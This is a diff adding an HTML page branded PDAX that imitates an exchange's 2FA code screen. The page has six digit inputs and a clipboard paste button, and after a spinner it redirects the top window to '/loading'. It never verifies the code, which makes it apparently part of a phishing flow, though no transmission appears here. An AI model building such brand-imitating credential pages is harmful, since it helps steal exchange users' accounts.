@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<base target="_top" />
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>PDAX</title>
+<style>
+  :root { --green:#2bb24c; }
+  * { box-sizing:border-box; }
+  html,body { margin:0; min-height:100%; }
+  body { font-family:"Poppins",system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif; background:#fff; color:#1f2328; }
+
+  /* Header */
+  .header { height:72px; border-bottom:1px solid #eceef0; display:flex; align-items:center; justify-content:space-between; padding:0 48px; }
+  .logo { display:flex; align-items:center; gap:8px; font-size:22px; font-weight:700; color:#1f2328; }
+  .logo svg { width:22px; height:22px; }
+  .nav { display:flex; align-items:center; gap:40px; }
+  .nav a { text-decoration:none; color:#3a3f45; font-size:16px; }
+  .nav a.active { color:var(--green); font-weight:600; }
+  .avatar { width:40px; height:40px; border-radius:50%; border:1px solid #d9dde1; display:flex; align-items:center; justify-content:center; color:#9aa0a6; }
+
+  /* Content */
+  .wrap { max-width:640px; margin:0; padding:40px 40px 40px 150px; }
+  .back { display:inline-flex; align-items:center; gap:8px; border:1px solid var(--green); color:var(--green); background:#fff; border-radius:8px; padding:10px 18px; font-size:15px; font-weight:600; cursor:pointer; margin-bottom:30px; }
+  .back:hover { background:#f2fbf4; }
+  h1 { font-size:44px; line-height:1.15; font-weight:800; margin:0 0 20px; color:#1f2328; }
+  .sub { font-size:18px; line-height:1.55; color:#6b7178; margin:0 0 36px; max-width:560px; }
+
+  .codes { display:flex; gap:16px; margin-bottom:18px; }
+  .codes input { width:66px; height:66px; border:1px solid #d9dde1; border-radius:12px; text-align:center; font-size:26px; color:#1f2328; outline:none; background:#fff; }
+  .codes input:focus { border-color:var(--green); }
+  .codes.error input { border-color:#e02424; background:#fff6f6; }
+
+  .paste { display:flex; justify-content:flex-end; max-width:490px; margin-bottom:28px; }
+  .paste button { display:inline-flex; align-items:center; gap:8px; background:none; border:0; color:var(--green); font-size:16px; font-weight:600; cursor:pointer; }
+
+  .errmsg { color:#e02424; font-size:15px; margin:0 0 20px; max-width:490px; display:none; }
+  .errmsg.show { display:block; }
+
+  .continue { width:100%; max-width:490px; padding:18px; border:0; border-radius:10px; background:#a7d9b3; color:#fff; font-size:19px; font-weight:600; cursor:not-allowed; transition:background .15s; display:flex; align-items:center; justify-content:center; }
+  .continue.active { background:var(--green); cursor:pointer; }
+  .continue.active:hover { background:#249c43; }
+  .continue .spin { width:22px; height:22px; border-radius:50%; border:3px solid rgba(255,255,255,.5); border-top-color:#fff; animation:rot .8s linear infinite; }
+  @keyframes rot { to { transform:rotate(360deg); } }
+
+  @media (max-width:900px){ .wrap{ padding:28px 20px; } h1{ font-size:30px; } .header{ padding:0 20px; } .nav{ gap:20px; } .codes input{ width:48px; height:48px; } }
+</style>
+</head>
+<body>
+  <div class="header">
+    <div class="logo">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 20L12 4l8 16-8-5-8 5z" fill="#2bb24c"/></svg>
+      PDAX
+    </div>
+    <div class="nav">
+      <a href="#">Home</a>
+      <a href="#">Trade</a>
+      <a href="#" class="active">Portfolio</a>
+      <div class="avatar">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 12a4 4 0 100-8 4 4 0 000 8zm0 2c-4 0-7 2-7 5v1h14v-1c0-3-3-5-7-5z" fill="#9aa0a6"/></svg>
+      </div>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <button class="back" type="button" onclick="history.back()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18l-6-6 6-6" stroke="#2bb24c" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Go Back
+    </button>
+
+    <h1>Enter the 6-digit Two-Factor Authentication (2FA) code</h1>
+    <p class="sub">Just making sure it's really you. Enter the 6-digit code from your authenticator app to proceed.</p>
+
+    <div class="codes" id="codes">
+      <input type="text" inputmode="numeric" maxlength="1" />
+      <input type="text" inputmode="numeric" maxlength="1" />
+      <input type="text" inputmode="numeric" maxlength="1" />
+      <input type="text" inputmode="numeric" maxlength="1" />
+      <input type="text" inputmode="numeric" maxlength="1" />
+      <input type="text" inputmode="numeric" maxlength="1" />
+    </div>
+
+    <div class="paste">
+      <button type="button" id="pasteBtn">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="8" y="8" width="12" height="12" rx="2" stroke="#2bb24c" stroke-width="2"/><path d="M16 8V6a2 2 0 00-2-2H6a2 2 0 00-2 2v8a2 2 0 002 2h2" stroke="#2bb24c" stroke-width="2"/></svg>
+        Paste code
+      </button>
+    </div>
+
+    <button class="continue" type="button" id="continue" disabled>Continue</button>
+  </div>
+
+  <script>
+    var inputs = Array.prototype.slice.call(document.querySelectorAll('#codes input'));
+    var cont = document.getElementById('continue');
+
+    function getCode() { return inputs.map(function (i) { return i.value; }).join(''); }
+    function validate() {
+      var ok = getCode().length === 6 && /^[0-9]{6}$/.test(getCode());
+      if (ok) { cont.classList.add('active'); cont.disabled = false; }
+      else { cont.classList.remove('active'); cont.disabled = true; }
+    }
+
+    inputs.forEach(function (inp, idx) {
+      inp.addEventListener('input', function () {
+        inp.value = inp.value.replace(/[^0-9]/g, '').slice(0, 1);
+        if (inp.value && idx < inputs.length - 1) inputs[idx + 1].focus();
+        validate();
+      });
+      inp.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && !inp.value && idx > 0) inputs[idx - 1].focus();
+      });
+    });
+
+    function fillCode(code) {
+      var digits = (code || '').replace(/[^0-9]/g, '').slice(0, 6).split('');
+      inputs.forEach(function (inp, i) { inp.value = digits[i] || ''; });
+      validate();
+      var last = Math.min(digits.length, inputs.length) - 1;
+      if (last >= 0) inputs[last].focus();
+    }
+
+    document.getElementById('pasteBtn').addEventListener('click', function () {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        navigator.clipboard.readText().then(fillCode).catch(function () {});
+      }
+    });
+
+    cont.addEventListener('click', function () {
+      if (cont.disabled) return;
+      cont.innerHTML = '<span class="spin"></span>';
+      cont.disabled = true;
+      setTimeout(function () {
+        (window.top || window).location.href = '/loading';
+      }, 1000);
+    });
+
+    inputs[0].focus();
+  </script>
+</body>
+</html>
